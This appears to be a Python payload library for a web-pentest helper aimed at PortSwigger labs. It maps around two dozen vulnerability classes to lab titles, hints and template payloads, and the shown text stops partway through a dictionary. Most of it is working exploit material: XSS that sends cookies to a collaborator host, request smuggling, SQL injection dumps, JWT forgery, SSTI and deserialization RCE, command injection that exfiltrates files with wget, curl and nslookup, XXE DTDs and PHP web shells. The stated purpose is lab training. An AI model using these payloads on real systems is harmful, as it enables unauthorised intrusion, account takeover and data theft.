"""Payload library — the playbook's canonical payloads, verbatim, keyed by
vuln class. `render()` swaps the three placeholders. Each class also carries
its PortSwigger lab list (the "when stuck, use these as a guide" links) and the
Detect / Play one-liners.

Payloads are stored as (name, template, kind). kind="detect" is a SAFE probe
(fired automatically in confirm step); kind="exploit" is held unless --mode lab.
"""
from __future__ import annotations

from .models import Payload

# PortSwigger topic base; lab titles come straight from the playbook so you can
# search-to-lab fast. These are the "stuck? read the matching lab" references.
PS = "https://portswigger.net/web-security"

LABS: dict[str, list[str]] = {
    "content-discovery": [
        "Information disclosure in error messages",
        "Source code disclosure via backup files",
        "Information disclosure in version control history",
    ],
    "dom-xss": [
        "DOM XSS in innerHTML sink using source location.search",
        "DOM XSS using web messages and JSON.parse",
        "Reflected DOM XSS",
    ],
    "web-message-xss": [
        "DOM XSS using web messages and JSON.parse",
    ],
    "reflected-stored-xss": [
        "Reflected XSS into HTML context with most tags and attributes blocked",
        "Reflected XSS with some SVG markup allowed",
        "Exploiting cross-site scripting to steal cookies",
    ],
    "cache-poisoning": [
        "Web cache poisoning with an unkeyed header",
        "Web cache poisoning via an unkeyed query parameter",
        "Parameter cloaking",
    ],
    "host-header": [
        "Basic password reset poisoning",
        "Host header authentication bypass",
        "Routing-based SSRF",
    ],
    "request-smuggling": [
        "HTTP request smuggling, basic CL.TE vulnerability",
        "Exploiting HTTP request smuggling to deliver reflected XSS",
        "H2.CL request smuggling",
    ],
    "user-enum-brute": [
        "Username enumeration via different responses",
        "Broken brute-force protection, IP block",
        "2FA broken logic",
    ],
    "oauth-takeover": [
        "Authentication bypass via OAuth implicit flow",
        "Forced OAuth profile linking",
        "Stealing OAuth access tokens via an open redirect",
    ],
    "cswsh": [
        "Cross-site WebSocket hijacking",
        "Manipulating WebSocket messages to exploit vulnerabilities",
    ],
    "csrf-takeover": [
        "CSRF vulnerability with no defenses",
        "CSRF where token is not tied to user session",
        "SameSite Lax bypass via method override",
    ],
    "password-reset-logic": [
        "Password reset broken logic",
        "Password reset poisoning via middleware",
        "Authentication bypass via flawed state machine",
    ],
    "sql-injection": [
        "SQL injection UNION attack, retrieving data from other tables",
        "Blind SQL injection with conditional responses",
        "SQL injection with filter bypass via XML encoding",
    ],
    "jwt-forge": [
        "JWT authentication bypass via unverified signature",
        "JWT authentication bypass via jwk header injection",
        "JWT authentication bypass via kid header path traversal",
        "JWT authentication bypass via algorithm confusion",
    ],
    "client-side-proto-pollution": [
        "Client-side prototype pollution via browser APIs",
        "DOM XSS via client-side prototype pollution",
        "Client-side prototype pollution via flawed sanitization",
    ],
    "idor-mass-assign": [
        "User role can be modified in user profile",
        "User ID controlled by request parameter with password disclosure",
        "Method-based access control can be circumvented",
    ],
    "cors-exfil": [
        "CORS vulnerability with basic origin reflection",
        "CORS vulnerability with trusted null origin",
        "CORS vulnerability with trusted insecure protocols",
    ],
    "api-graphql": [
        "Exploiting an API endpoint using documentation",
        "Exploiting a mass assignment vulnerability",
        "Finding a hidden GraphQL endpoint",
    ],
    "path-traversal": [
        "File path traversal, simple case",
        "Traversal sequences stripped with superfluous URL-decode",
        "Validation of file extension with null byte bypass",
    ],
    "ssti": [
        "Basic server-side template injection",
        "Server-side template injection using documentation",
        "Server-side template injection in a sandboxed environment",
    ],
    "os-command-injection": [
        "OS command injection, simple case",
        "Blind OS command injection with time delays",
        "Blind OS command injection with out-of-band data exfiltration",
    ],
    "ssrf": [
        "Basic SSRF against another back-end system",
        "SSRF with filter bypass via open redirection vulnerability",
        "Blind SSRF with out-of-band detection",
    ],
    "xxe": [
        "Exploiting XXE using external entities to retrieve files",
        "Exploiting blind XXE to exfiltrate data using a malicious external DTD",
        "Exploiting XInclude to retrieve files",
    ],
    "file-upload-rce": [
        "Remote code execution via web shell upload",
        "Web shell upload via Content-Type restriction bypass",
        "Web shell upload via path traversal",
    ],
    "deserialization": [
        "Modifying serialized objects",
        "Exploiting Java deserialization with Apache Commons",
        "Exploiting PHP deserialization with a pre-built gadget chain",
    ],
    "server-side-proto-pollution": [
        "Privilege escalation via server-side prototype pollution",
        "Remote code execution via server-side prototype pollution",
        "Exfiltrating sensitive data via server-side prototype pollution",
    ],
}

# Detect / Play guidance lifted from the playbook, per class.
HINTS: dict[str, dict[str, str]] = {
    "content-discovery": {
        "detect": "Fuzz paths (ffuf/Burp); read robots.txt, sitemap.xml; pull .git; grep JS + HTML comments; trip verbose errors.",
        "play": "Leaked endpoints / backup source / .git creds are often the foothold or the jump to it.",
    },
    "dom-xss": {
        "detect": "DOM Invader canary, or grep JS for source (location.search/hash, referrer, postMessage) into a sink (innerHTML, eval, document.write, location).",
        "play": "Match the sink, deliver via exploit server, exfil cookie to OAST. WAF? base64 behind eval(atob()) or \\u-escape keywords.",
    },
    "web-message-xss": {
        "detect": "postMessage listener with no e.origin check.",
        "play": "Frame the target, postMessage a javascript: url / JSON into the sink.",
    },
    "reflected-stored-xss": {
        "detect": "Active-scan search param. Reflect <img src=1 onerror=alert(1)>; Intruder PortSwigger tag list, then events on surviving tags.",
        "play": "Pick surviving tag+event, steal cookie to OAST. <script> blocked -> </ScRiPt><img onerror>.",
    },
    "cache-poisoning": {
        "detect": "Confirm caching (X-Cache miss->hit, Age); ?cb= buster while probing; Param Miner guess-headers; canary in X-Forwarded-Host reflected into cached .js.",
        "play": "Poison a cached script src so every user (incl admin) gets your JS. Drop cache-buster on final send.",
    },
    "host-header": {
        "detect": "Change Host / add X-Forwarded-Host with a canary; see it in a generated link or break routing.",
        "play": "Point the reset link at your server -> carlos's token hits your exploit log -> reset -> login.",
    },
    "request-smuggling": {
        "detect": "HTTP Request Smuggler probe — keep the 200 (400s useless); strip sec-* headers; often disable HTTP/2.",
        "play": "Smuggle a prefix to reach front-end-blocked /admin, or a stored-XSS User-Agent. CL must be byte-exact.",
    },
    "user-enum-brute": {
        "detect": "Diff valid vs invalid username (wording — trailing '.' — status, timing); check lockout; inspect 2FA + stay-logged-in.",
        "play": "Enumerate user then Intruder password (macro keeps CSRF fresh). Rotate X-Forwarded-For; brute stay-logged-in.",
    },
    "oauth-takeover": {
        "detect": "A 'log in with…' button. Walk /auth (client_id, redirect_uri, response_type, scope, state), /callback, /authenticate. Missing state = CSRF-able.",
        "play": "Implicit: swap email on token-submit. Or hijack redirect_uri to capture code/token, then replay.",
    },
    "cswsh": {
        "detect": "A wss:// handshake. Check for CSRF token / SameSite — cookie-only auth is hijackable cross-site.",
        "play": "From exploit server open the socket in victim context, relay every message to OAST (chat often holds creds).",
    },
    "csrf-takeover": {
        "detect": "Token missing / not tied to session / duplicated in cookie; check SameSite; try POST->GET _method; drop the token.",
        "play": "Deliver PoC to admin -> change email to yours -> reset in. Beat SameSite with top-level GET / method override.",
    },
    "password-reset-logic": {
        "detect": "Is the token tied to the user, removable, or host-controlled? Can change-password skip the current password?",
        "play": "Drop the token and set username=administrator; or change-password without the current one.",
    },
    "sql-injection": {
        "detect": "Active-scan 'advanced search' params + TrackingId cookie. Lone '; ' AND 1=1-- vs 1=2--; time delay. ID the DBMS. Exam favourite closes with ')) … -- -.",
        "play": "Dump users -> admin password; or login-bypass administrator'--. Blind time-based Intruder: Resource Pool = 1 thread.",
    },
    "jwt-forge": {
        "detect": "Token in cookie/Authorization/body; decode header+payload; check alg + whether signature is verified. JWT Editor passive scan flags weak keys.",
        "play": "sub/role -> admin via unverified sig, alg:none, cracked secret, jwk/jku/kid injection, or RS256->HS256 confusion.",
    },
    "client-side-proto-pollution": {
        "detect": "Inject __proto__[x]=y via URL/JSON, check Object.prototype.x in console. DOM Invader has a PP scan.",
        "play": "Pollute a property later read as config/sink (script src, isAdmin) to reach DOM XSS / privilege.",
    },
    "idor-mass-assign": {
        "detect": "Compare change-email response JSON to request — often returns extra fields like roleid. Tamper IDs/role; force-browse /admin; try X-Original-URL.",
        "play": "Mass-assign a privileged role into the update body; read admin data; or reach the panel directly. Brute roleid 0-1000.",
    },
    "cors-exfil": {
        "detect": "Add Origin: https://evil to a credentialed sensitive request — ACAO reflects + Allow-Credentials: true => exploitable. Also Origin: null.",
        "play": "From exploit server fetch the endpoint with credentials and exfil; delivered to admin, read their key/session.",
    },
    "api-graphql": {
        "detect": "Find API docs/hidden endpoints (ffuf, /api, Swagger); try other verbs; GraphQL introspection; SSPP with %26.",
        "play": "Mass-assign privileged fields, hit unused endpoints, or introspect GraphQL for private fields/mutations.",
    },
    "path-traversal": {
        "detect": "An admin image loader (file_name=/imagefile=) with no size param. Active-scan proves traversal via /etc/passwd.",
        "play": "Walk to /home/carlos/secret. Stripped once? Double-encode. 'secret' blacklisted? Double-encode a letter. PHP wrapper reads source as base64.",
    },
    "ssti": {
        "detect": "Password-reset / email template editor, or 'out of stock' view reflecting input. Fuzz ${{<%[%'\"}}%\\ -> 500 = SSTI. {{7*7}}->49, {{7*'7'}}->7777777 = Jinja2.",
        "play": "Inject into template field, trigger reset, read rendered output. Fire documented RCE to cat the secret.",
    },
    "os-command-injection": {
        "detect": "Active-scan an admin image endpoint with ImgSize/size, a feedback/contact email field, or XML fields. Confirm with nslookup/ping to Collaborator.",
        "play": "Output rarely reflects — exfil OOB. Backticks inside the size value; nslookup $(cat secret).COLLAB. In XML the field is usually email; escape & as &amp;.",
    },
    "ssrf": {
        "detect": "A 'download report/generate file' (PDF) or stock-check carrying a URL. Point at Collaborator; try 127.0.0.1, localhost:PORT (port in the brief).",
        "play": "Reach internal/admin, or make the PDF generator embed a local file via <iframe src=http://localhost:PORT/secret>. file:// reads directly.",
    },
    "xxe": {
        "detect": "Any XML body/upload (SOAP, import, stock-check; or flip a JSON endpoint to application/xml). Active-scan flags 'External service interaction'.",
        "play": "Read in-band by expanding &xxe; into a reflected element; else OOB with a malicious external DTD. No DOCTYPE -> XInclude.",
    },
    "file-upload-rce": {
        "detect": "An avatar upload, or admin 'set post image by URL' that fetches+executes. Probe extension blacklist, content-type check, path handling.",
        "play": "Land a PHP shell that reads the secret; beat filters with type spoof, .phtml/.phar, .htaccess, traversal, polyglot. RFI -> host on exploit server.",
    },
    "deserialization": {
        "detect": "Base64/gzip blobs in cookies. PHP O:/a: objects; leaked CustomTemplate.php~ reveals a magic method; Symfony phpinfo leaks the secret key.",
        "play": "Flip a field for privilege (PHP s->i), abuse __destruct to read a file, or build a gadget chain for RCE — re-wrap into the cookie's exact envelope.",
    },
    "server-side-proto-pollution": {
        "detect": "Send __proto__ in a JSON body and watch for a behaviour change with no reflection. Param Miner has a server-side scan.",
        "play": "Escalate first (isAdmin:true), then RCE by polluting a spawn option (execArgv/NODE_OPTIONS) and triggering a child process.",
    },
}


# The payload bank. Placeholders LAB/EXPLOIT/COLLAB are resolved at render time.
_BANK: dict[str, list[tuple[str, str, str]]] = {
    "content-discovery": [
        ("directory brute-force",
         "ffuf -c -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 "
         "-u https://LAB/FUZZ", "detect"),
        ("dump exposed git history -> read creds",
         "wget -r https://LAB/.git/\n"
         "cd LAB && git log --all -p | less   # or tig . / git-cola", "detect"),
        ("quick checks",
         "/robots.txt  /sitemap.xml  /.git/config  /backup/  /~admin\n"
         "# also: view-source, backup suffix ~ (CustomTemplate.php~), grep JS for API keys", "detect"),
    ],
    "dom-xss": [
        ("reflected eval / JSON sink — cookie exfil",
         "https://LAB/?search=\\\"-fetch(`https://COLLAB/?c=${document.cookie}`)}//", "exploit"),
        ("same sink, WAF bypass (base64 behind eval(atob()))",
         "\\\"-eval(atob(`ZmV0Y2goYGh0dHBzOi8vQ09MTEFCLm9hc3RpZnkuY29tLz9jPWAgKyBkb2N1bWVudFtgY29va2llYF0p`))}//", "exploit"),
        ("web message (JSON.parse sink) — exploit server body",
         "<iframe src=\"https://LAB/\" onload='this.contentWindow.postMessage(JSON.stringify({type:\"load-channel\",url:\"javascript:fetch(`https://COLLAB/?c=${document.cookie}`)\"}),\"*\")'></iframe>", "exploit"),
        ("AngularJS (ng-app) sandbox escape",
         "{{$on.constructor('document.location=\"https://COLLAB/?c=\"+document.cookie')()}}", "exploit"),
    ],
    "web-message-xss": [
        ("web message (JSON.parse sink) — exploit server body",
         "<iframe src=\"https://LAB/\" onload='this.contentWindow.postMessage(JSON.stringify({type:\"load-channel\",url:\"javascript:fetch(`https://COLLAB/?c=${document.cookie}`)\"}),\"*\")'></iframe>", "exploit"),
    ],
    "reflected-stored-xss": [
        ("probe — benign reflection canary",
         "<img src=1 onerror=alert(1)>", "detect"),
        ("stored XSS — cookie beacon (paste into the vulnerable field)",
         "<script>fetch('https://COLLAB',{method:'POST',mode:'no-cors',body:document.cookie})</script>", "exploit"),
        ("most tags blocked -> surviving-tag event (deliver via exploit server)",
         "<iframe src=\"https://LAB/?search=%22%3E%3Cbody%20onhashchange=document.location=`https://COLLAB/?c=`+document.cookie%3E\" onload=\"this.src+='#x'\"></iframe>", "exploit"),
        ("<script> filtered — case-broken close + img onerror",
         "</ScRiPt><img src=a onerror=document.location='https://COLLAB/?c='+document.cookie>", "exploit"),
    ],
    "cache-poisoning": [
        ("probe — confirm cache + unkeyed header reflection",
         "GET /resources/js/tracking.js HTTP/2\nHost: LAB\nX-Forwarded-Host: canary.invalid", "detect"),
        ("poison request — Repeater (keep ?cb= until ready)",
         "GET /resources/js/tracking.js HTTP/2\nHost: LAB\nX-Forwarded-Host: EXPLOIT", "exploit"),
        ("exploit server hosts this at /resources/js/tracking.js",
         "document.location='https://COLLAB/?c='+document.cookie", "exploit"),
        ("parameter cloaking (unkeyed 2nd param honored)",
         "GET /js/geolocate.js?callback=setCountryCookie&utm_content=x;callback=alert(1) HTTP/2", "exploit"),
    ],
    "host-header": [
        ("probe — X-Forwarded-Host canary",
         "POST /forgot-password HTTP/2\nHost: LAB\nX-Forwarded-Host: canary.invalid\n"
         "Content-Type: application/x-www-form-urlencoded\n\nusername=carlos", "detect"),
        ("password-reset poisoning — token lands in your access log",
         "POST /forgot-password HTTP/2\nHost: LAB\nX-Forwarded-Host: EXPLOIT\n"
         "Content-Type: application/x-www-form-urlencoded\n\nusername=carlos", "exploit"),
        ("localhost-only admin via Host",
         "GET /admin HTTP/2\nHost: localhost", "exploit"),
    ],
    "request-smuggling": [
        ("CL.TE — reach front-end-blocked /admin (single connection)",
         "POST / HTTP/1.1\nHost: LAB\nContent-Type: application/x-www-form-urlencoded\n"
         "Content-Length: 60\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost", "exploit"),
        ("deliver XSS via smuggled User-Agent (send ~100x with null payloads)",
         "GET /post?postId=4 HTTP/1.1\nHost: LAB\n"
         "User-Agent: \"><script>var x=new XMLHttpRequest();x.open(\"GET\",\"https://COLLAB/?c=\"+document.cookie);x.send()</script>\nFoo: x", "exploit"),
    ],
    "user-enum-brute": [
        ("dodge IP-based lockout — rotate per request in Intruder",
         "X-Forwarded-For: 1.1.1.§1§", "exploit"),
        ("stay-logged-in cookie (Intruder: MD5 -> prefix carlos: -> base64)",
         "stay-logged-in = base64( \"carlos:\" + md5(password) )", "exploit"),
        ("reset the failed-login counter by interleaving a valid login",
         "# Pitchfork: user list / password list\nwiener:peter   # valid, resets counter\n"
         "carlos:candidate1\nwiener:peter\ncarlos:candidate2   # 2FA: complete step 1, then GET /my-account", "exploit"),
    ],
    "oauth-takeover": [
        ("implicit flow — swap identity on the token-submit POST",
         "POST /authenticate HTTP/2\nHost: LAB\nContent-Type: application/json\n\n"
         "{\"email\":\"carlos@carlos-montoya.net\",\"username\":\"carlos\",\"token\":\"<victim-or-your-token>\"}", "exploit"),
        ("steal the code — point redirect_uri at your server",
         "GET /auth?client_id=CID&redirect_uri=https://COLLAB&response_type=code&scope=openid%20profile%20email HTTP/2\nHost: oauth-LAB", "exploit"),
        ("forced OAuth linking (no state) — exploit server body",
         "<iframe onload=\"this.src='https://LAB/oauth-linking?code=STOLEN_CODE'\"></iframe>", "exploit"),
    ],
    "cswsh": [
        ("cross-site WebSocket hijack — exploit server body",
         "<script>\nvar ws = new WebSocket('wss://LAB/chat');\nws.onopen = function(){ ws.send('READY'); };\n"
         "ws.onmessage = function(e){ fetch('https://COLLAB/?d='+encodeURIComponent(e.data),{mode:'no-cors'}); };\n</script>", "exploit"),
    ],
    "csrf-takeover": [
        ("auto-submit CSRF (referrer stripped) — exploit server body",
         "<meta name=\"referrer\" content=\"no-referrer\">\n"
         "<form action=\"https://LAB/my-account/change-email\" method=\"POST\">\n"
         " <input type=\"hidden\" name=\"email\" value=\"attacker@EXPLOIT\">\n</form>\n"
         "<script>history.pushState('','','/');document.forms[0].submit();</script>", "exploit"),
        ("SameSite Lax bypass — method override to GET",
         "https://LAB/my-account/change-email?email=attacker@EXPLOIT&_method=POST", "exploit"),
    ],
    "password-reset-logic": [
        ("broken reset logic — drop the token, point at administrator",
         "POST /forgot-password?temp-forgot-password-token= HTTP/2\nHost: LAB\n"
         "Content-Type: application/x-www-form-urlencoded\n\n"
         "temp-forgot-password-token=&username=administrator&new-password-1=hacked123&new-password-2=hacked123", "exploit"),
        ("change password without current-password",
         "POST /my-account/change-password HTTP/2\nHost: LAB\n"
         "Content-Type: application/x-www-form-urlencoded\n\n"
         "username=administrator&new-password-1=hacked123&new-password-2=hacked123", "exploit"),
    ],
    "sql-injection": [
        ("probe — boolean pair (compare bodies)",
         "'+AND+1=1--   vs   '+AND+1=2--", "detect"),
        ("UNION — dump credentials (find column count + a text col first)",
         "' UNION SELECT username, password FROM users--", "exploit"),
        ("visible error-based (PostgreSQL) — whole table in the error",
         "' AND 1=CAST((SELECT string_agg(username||':'||password,',') FROM users) AS int)--", "exploit"),
        ("blind boolean, char-by-char — Intruder cluster bomb, 1 THREAD",
         "'));SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') "
         "THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users-- -", "exploit"),
        ("Oracle blind — OOB exfil of admin password to Collaborator",
         "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/\">%remote;]>'),'/l') FROM dual--", "exploit"),
        ("sqlmap — match context with --prefix/--suffix (save the request first)",
         "sqlmap -r request.txt -p query --batch --level 5 --risk 3 "
         "--prefix=\"'))\" --suffix=\"-- -\" --dbms=postgresql -T users --dump", "exploit"),
    ],
    "jwt-forge": [
        ("alg:none — set header alg none, payload sub, delete the signature",
         "{\"alg\":\"none\",\"typ\":\"JWT\"} . {\"sub\":\"administrator\"} .", "exploit"),
        ("crack a weak key, then re-sign in JWT Editor with the secret",
         "hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/jwt.secrets.list", "exploit"),
        ("jku injection — host JWKS on the exploit server, point jku at it",
         "# JWT Editor: New RSA Key -> copy public as JWK -> exploit-server /jwks.json\n"
         "# header: {\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://EXPLOIT/jwks.json\",\"kid\":\"YOUR-KID\"}\n"
         "# payload sub=administrator, sign with your key", "exploit"),
        ("kid path traversal — force a known/empty key file",
         "{\"alg\":\"HS256\",\"kid\":\"../../../../../../dev/null\",\"typ\":\"JWT\"}\n"
         "# then HMAC-sign with a single NULL byte (symmetric k = AA==)", "exploit"),
    ],
    "client-side-proto-pollution": [
        ("client-side -> DOM XSS via a polluted gadget (URL)",
         "https://LAB/?__proto__[transport_url]=data:,alert(document.cookie)//", "exploit"),
        ("JSON body variant / sanitizer bypass",
         "{\"__proto__\":{\"transport_url\":\"data:,alert(document.cookie)//\"}}\n"
         "# strips __proto__ once? __pro__proto__to__[transport_url]=data:,alert(1)//", "exploit"),
    ],
    "idor-mass-assign": [
        ("mass assignment — add roleid to the update body",
         "{\"csrf\":\"…\",\"email\":\"wiener@x.com\",\"roleid\":§1§}   # brute 0-1000, sort by length", "exploit"),
        ("URL / method override to reach admin functions",
         "GET /admin/delete?username=carlos HTTP/2\nHost: LAB\nX-Original-URL: /admin", "exploit"),
    ],
    "cors-exfil": [
        ("probe — reflect a test Origin on a credentialed endpoint",
         "GET /accountDetails HTTP/2\nHost: LAB\nOrigin: https://evil.example\nCookie: <your session>", "detect"),
        ("credentialed cross-origin read -> exfil — exploit server body",
         "<script>\nvar req = new XMLHttpRequest();\n"
         "req.onload = function(){ location='https://EXPLOIT/log?d='+encodeURIComponent(this.responseText); };\n"
         "req.open('GET','https://LAB/accountDetails',true);\nreq.withCredentials = true;\nreq.send();\n</script>", "exploit"),
    ],
    "api-graphql": [
        ("GraphQL introspection — dump the schema",
         "{\"query\":\"{__schema{queryType{name} mutationType{name} types{name kind fields{name}}}}\"}", "detect"),
        ("server-side parameter pollution (query-string)",
         "GET /api/user?name=administrator%26role=admin%23 HTTP/2\nHost: LAB", "exploit"),
    ],
    "path-traversal": [
        ("traversal + common bypasses",
         "../../../../home/carlos/secret\n"
         "....//....//....//home/carlos/secret   (strip-once bypass)\n"
         "/home/carlos/secret   (absolute, if ../ blocked)\n"
         "../../../../home/carlos/secret%00.png   (extension check)", "exploit"),
        ("double-URL-encode traversal AND the 's' in secret (WAF/blacklist)",
         "..%252f..%252f..%252f..%252f..%252f..%252f/home/carlos/%2573ecret", "exploit"),
        ("PHP filter wrapper — read source as base64",
         "php://filter/convert.base64-encode/resource=/home/carlos/secret", "exploit"),
    ],
    "ssti": [
        ("probe — breakage fuzz then arithmetic",
         "${{<%[%'\"}}%\\      then  {{7*7}}  and  {{7*'7'}}", "detect"),
        ("Jinja2 — via os.popen (import through globals)",
         "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/carlos/secret').read()}}", "exploit"),
        ("Jinja2 sandbox — file object through subclasses (index varies)",
         "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/carlos/secret').read() }}\n"
         "{{ settings.SECRET_KEY }}   # Django info-disclosure fallback", "exploit"),
        ("other engines",
         "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /home/carlos/secret\")}   # Freemarker\n"
         "<%= File.read('/home/carlos/secret') %>   # ERB (Ruby)", "exploit"),
    ],
    "os-command-injection": [
        ("probe — OOB DNS ping (watch Collaborator)",
         "`nslookup canary.COLLAB`", "detect"),
        ("image size param — DNS exfil via backticks",
         "GET /admin_panel/adminimage?imageFileName=/blog/posts/66.jpg&ImgSize=`nslookup $(cat /home/carlos/secret).COLLAB`", "exploit"),
        ("…or POST the file straight out with wget",
         "ImgSize=`/usr/bin/wget --post-file /home/carlos/secret https://COLLAB/`", "exploit"),
        ("XML upload — cmdi in the email field (DOCTYPE disallowed)",
         "<email>`0&amp;nslookup -q=cname $(cat /home/carlos/secret).COLLAB &amp;`</email>", "exploit"),
    ],
    "ssrf": [
        ("probe — point the fetcher at Collaborator",
         "stockApi=https://COLLAB/", "detect"),
        ("PDF/report generator — embed the internal file (port from brief)",
         "{\"PageHtml\":\"<iframe src='http://localhost:6566/secret' height=500 width=500>\"}", "exploit"),
        ("reach an internal admin panel / read the file directly",
         "stockApi=http://localhost/admin/delete?username=carlos\nstockApi=file:///home/carlos/secret", "exploit"),
        ("filter bypasses",
         "http://127.1/   http://2130706433/   http://[::]/   # blacklist\n"
         "http://localhost%2523@LAB/admin   # whitelist via #", "exploit"),
    ],
    "xxe": [
        ("in-band file read (put &xxe; where a value is reflected)",
         "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
         "<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM \"file:///home/carlos/secret\"> ]>\n"
         "<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>", "exploit"),
        ("blind OOB — host this as a.dtd on your exploit server",
         "<!ENTITY % file SYSTEM \"file:///home/carlos/secret\">\n"
         "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'https://COLLAB/?x=%file;'>\">\n%eval;\n%exfil;", "exploit"),
        ("the upload that pulls your DTD (or XInclude if DOCTYPE blocked)",
         "<!DOCTYPE users [ <!ENTITY % xxe SYSTEM \"https://EXPLOIT/a.dtd\"> %xxe; ]>\n"
         "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///home/carlos/secret\"/></foo>", "exploit"),
    ],
    "file-upload-rce": [
        ("PHP web shell (upload, then browse to it)",
         "<?php echo file_get_contents('/home/carlos/secret'); ?>", "exploit"),
        ("multipart with bypasses — spoof type / traverse / alt extension",
         "Content-Disposition: form-data; name=\"avatar\"; filename=\"../shell.php\"\n"
         "Content-Type: image/jpeg\n\n<?php echo file_get_contents('/home/carlos/secret'); ?>\n"
         "# also try: shell.phtml  shell.php%00.jpg  exiftool -Comment='<?php … ?>' img.jpg", "exploit"),
        ("RFI — host exploit.php, reference with a fake image extension",
         "https://EXPLOIT/exploit.php?.jpg\n"
         "# exploit.php: <?php echo file_get_contents('/home/carlos/secret'); ?>", "exploit"),
    ],
    "deserialization": [
        ("Java gadget -> RCE (inner base64 = curl-exfil)",
         "java -jar ysoserial-all.jar CommonsCollections4 "
         "'bash -c {echo,BASE64CMD}|{base64,-d}|bash' | gzip | base64 -w0", "exploit"),
        ("PHP — magic-method file read / privilege type-juggle",
         "O:14:\"CustomTemplate\":1:{s:14:\"lock_file_path\";s:23:\"/home/carlos/morale.txt\";}\n"
         "O:4:\"User\":2:{s:8:\"username\";s:13:\"administrator\";s:12:\"access_token\";i:0;}   # s->i juggle", "exploit"),
        ("PHP Symfony — phpggc, then sign with the leaked secret",
         "phpggc Symfony/RCE4 exec 'curl https://COLLAB/?x=$(base64 -w0 /home/carlos/secret)' | base64 -w0", "exploit"),
    ],
    "server-side-proto-pollution": [
        ("probe — privilege escalation",
         "{\"__proto__\":{\"isAdmin\":true}}", "detect"),
        ("RCE via a polluted spawn option -> exfil to Collaborator",
         "{\"__proto__\":{\"execArgv\":[\"--eval=require('child_process').execSync('curl https://COLLAB/?x=$(base64 -w0 /home/carlos/secret)')\"]}}", "exploit"),
    ],
}


# plain-English, for the "DO THIS NOW" panel (mirrors the dashboard glossary)
WHATIS = {
    "content-discovery": "A hidden file or page (backup, .git, debug) is exposed — often leaking credentials or source.",
    "dom-xss": "Your input runs as JavaScript in the page.",
    "web-message-xss": "The page trusts cross-window messages without checking the sender.",
    "reflected-stored-xss": "Your input is echoed into the page and runs as code.",
    "cache-poisoning": "A cached response reflects attacker input, so every visitor gets served your payload.",
    "host-header": "The app trusts the Host header — you can poison reset links, bypass auth, or reach internal systems.",
    "request-smuggling": "Front-end and back-end disagree on where a request ends — you can hide a second request.",
    "user-enum-brute": "Login tells valid from invalid usernames (or has weak lockout) — you can brute a password / 2FA code.",
    "oauth-takeover": "The social-login flow is flawed — you can log in as, or link to, another user's account.",
    "cswsh": "A WebSocket authenticates on cookies alone — your page can open it as the victim and read their data.",
    "sql-injection": "Your input reaches the database — you can read data you shouldn't.",
    "idor-mass-assign": "You can tamper an ID, add a role field, or change HTTP method to act as another user / admin.",
    "csrf-takeover": "An action can be forced on a logged-in victim from your page.",
    "password-reset-logic": "The password-reset flow is broken — you can reset another user's password.",
    "jwt-forge": "The login token (JWT) is forgeable — you can rewrite it to become admin.",
    "cors-exfil": "The site hands your page its data cross-origin, with credentials.",
    "api-graphql": "An API / GraphQL endpoint exposes extra fields, verbs, or docs you can abuse.",
    "client-side-proto-pollution": "You can inject properties onto every JS object, reaching a sink that runs code.",
    "ssrf": "The server fetches a URL you control — reach internal services or files.",
    "path-traversal": "A file parameter lets you walk the filesystem to read files.",
    "ssti": "Your input is rendered by a template engine — often code execution.",
    "os-command-injection": "Your input reaches a shell command on the server.",
    "xxe": "An XML parser will fetch external entities — read files / SSRF.",
    "file-upload-rce": "An upload may let you run server code.",
    "deserialization": "A serialized cookie can be tampered into code execution.",
    "server-side-proto-pollution": "Injecting __proto__ in a JSON body changes server behaviour — escalate or get RCE.",
}
NEXTSTEP = {
    "content-discovery": "Open the exposed path in the browser / download it (e.g. wget -r the .git) and read it for credentials or source.",
    "dom-xss": "Put the detect payload in your browser; expect an alert. Then use the exploit one to steal the victim's cookie.",
    "web-message-xss": "Host the iframe+postMessage payload on the exploit server and deliver it to the victim.",
    "reflected-stored-xss": "Paste the exploit payload into the field/URL; deliver via the exploit server to steal the victim's cookie.",
    "cache-poisoning": "In Repeater, add the unkeyed header/param with your payload and resend until X-Cache: hit; keep it poisoned for the victim.",
    "host-header": "In Repeater, set Host / X-Forwarded-Host to your exploit server (or localhost) and resend; read the victim's token from the access log.",
    "request-smuggling": "Switch Repeater to HTTP/1.1, send the CL.TE prefix twice on one connection; the second response shows the smuggled effect.",
    "user-enum-brute": "Send login to Intruder; brute the username list, then the password list for the valid one (rotate X-Forwarded-For if IP-blocked).",
    "oauth-takeover": "Walk the OAuth flow in Burp; swap the email/token on the /authenticate POST, or host the no-state linking iframe on the exploit server.",
    "cswsh": "Host the WebSocket-hijack script on the exploit server, deliver to the victim, and read their chat history from Collaborator.",
    "sql-injection": "Paste the READY dump payload into Burp Repeater and Send — the admin's password comes back in the response.",
    "idor-mass-assign": "Send the request to Repeater; change the id/role field, add roleid, or change the method (POST→GET) and resend.",
    "csrf-takeover": "Host the auto-submit form on the exploit server and deliver it to the victim to change their email/password.",
    "password-reset-logic": "Trigger a reset, send it to Repeater, drop the token and set username=administrator (or reuse a captured token).",
    "jwt-forge": "Open the token in JWT Editor; set sub=administrator, apply the attack named on the card (alg:none / Embedded JWK / algorithm confusion), resend.",
    "cors-exfil": "Host the credentialed XHR on the exploit server, deliver to the victim, and read their API key from the access log.",
    "api-graphql": "Walk up the path to the API docs / run GraphQL introspection (newline after __schema if blocked), then call the dangerous verb/mutation.",
